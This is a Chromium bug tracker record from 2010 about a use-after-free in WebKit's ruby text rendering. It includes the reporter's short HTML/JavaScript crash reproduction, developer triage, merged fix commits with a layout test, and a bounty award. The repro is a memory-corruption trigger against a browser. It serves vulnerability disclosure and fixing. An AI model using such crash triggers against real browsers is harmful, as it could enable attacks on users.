# Memory corruption with moving ruby text nodes to runs without ruby bases.

| Field | Value |
|-------|-------|
| **Issue ID** | [40082618](https://issues.chromium.org/issues/40082618) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ku...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2010-08-10 |
| **Bounty** | $1,000.00 |

## Description

1.htm
========================

<script> 
function crash(){
document.getElementsByTagName("body")[0].outerHTML=1
}
</script> 
<body onload='crash()'> 
<ruby> 
<fieldset/> 
</ruby> 
<rt> 
</rt> 
<blockquote> 
<body> 
</body> 
</blockquote> 
<rt/><rt/> 
</body>

chromium 6.0.490.0 (55524)

## Timeline

### in...@chromium.org (2010-08-10)

This is a user after free incorrectly done in one of the object destructor. So, definitely a secseverity high. Since probably there would be no more v5 patches after the upcoming one, marking this M6. I will take a closer look in morning.

### in...@chromium.org (2010-08-10)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-08-10)

Filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=43795

### in...@chromium.org (2010-08-10)

Committed r65090: <http://trac.webkit.org/changeset/65090>

### bu...@gmail.com (2010-08-12)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=55883 

------------------------------------------------------------------------
r55883 | inferno@chromium.org | 2010-08-12 07:11:08 -0700 (Thu, 12 Aug 2010) | 26 lines
Changed paths:
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/ruby/ruby-remove-no-base-expected.txt
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/ruby/ruby-remove-no-base.html
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/472/WebCore/rendering/RenderRubyRun.cpp?r1=55883&r2=55882

Merge 65090 - 2010-08-10  Abhishek Arya  <inferno@chromium.org>

        Reviewed by David Hyatt.

        Take checks for ruby base existence out of the ASSERTs.
        https://bugs.webkit.org/show_bug.cgi?id=43795

        Test: fast/ruby/ruby-remove-no-base.html

        * rendering/RenderRubyRun.cpp:
        (WebCore::RenderRubyRun::addChild):
        (WebCore::RenderRubyRun::removeChild):
2010-08-10  Abhishek Arya  <inferno@chromium.org>

        Reviewed by David Hyatt.

        Tests that removing a ruby child which causes merging of ruby base withe
        a non existant base of the right sibling run does not result in crash.
        https://bugs.webkit.org/show_bug.cgi?id=43795

        * fast/ruby/ruby-remove-no-base-expected.txt: Added.
        * fast/ruby/ruby-remove-no-base.html: Added.

BUG=51654

Review URL: http://codereview.chromium.org/3160007
------------------------------------------------------------------------


### bu...@gmail.com (2010-08-12)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=55884 

------------------------------------------------------------------------
r55884 | inferno@chromium.org | 2010-08-12 07:17:28 -0700 (Thu, 12 Aug 2010) | 26 lines
Changed paths:
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/375/LayoutTests/fast/ruby/ruby-remove-no-base-expected.txt
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/375/LayoutTests/fast/ruby/ruby-remove-no-base.html
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/375/WebCore/rendering/RenderRubyRun.cpp?r1=55884&r2=55883

Merge 65090 - 2010-08-10  Abhishek Arya  <inferno@chromium.org>

        Reviewed by David Hyatt.

        Take checks for ruby base existence out of the ASSERTs.
        https://bugs.webkit.org/show_bug.cgi?id=43795

        Test: fast/ruby/ruby-remove-no-base.html

        * rendering/RenderRubyRun.cpp:
        (WebCore::RenderRubyRun::addChild):
        (WebCore::RenderRubyRun::removeChild):
2010-08-10  Abhishek Arya  <inferno@chromium.org>

        Reviewed by David Hyatt.

        Tests that removing a ruby child which causes merging of ruby base withe
        a non existant base of the right sibling run does not result in crash.
        https://bugs.webkit.org/show_bug.cgi?id=43795

        * fast/ruby/ruby-remove-no-base-expected.txt: Added.
        * fast/ruby/ruby-remove-no-base.html: Added.

BUG=51654

Review URL: http://codereview.chromium.org/3179009
------------------------------------------------------------------------


### in...@chromium.org (2010-08-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-08-13)

@kuzzcc: congratulations! We'd like to provisionally offer you a $1000 reward for your help in reporting this bug. We are rewarding this higher amount because this is a "high quality report":
- The repro is small and fairly well reduced.
- The repro triggers the bug reliably.
Please continue to keep the details confidential until we release the fix in a patch. Also, once we've released the fix, please be considerate that other WebKit-based products might be releasing fix on different timelines.

In order to be sure to get the increased rewards for "high quality" reports in the future, please be sure to:
- Avoid filing duplicate bugs! If the stack trace and/or repros look similar, then the underlying bug may be the same.
- Include stack traces where possible.
- Always include an explanation of why it is a security bug. In the case of bugs like this bug, ALWAYS include details of the crash (assembly instruction and register contents).
- Where applicable, please include proof why a crash is more that just a null pointer dereference.

### [Deleted User] (2010-08-18)

[Empty comment from Monorail migration]

### [Deleted User] (2010-08-18)

Can't repro with 375.126 and 375.127 on Win

### sc...@gmail.com (2010-08-25)

Payment is in the electronic system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/51654?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082618)*
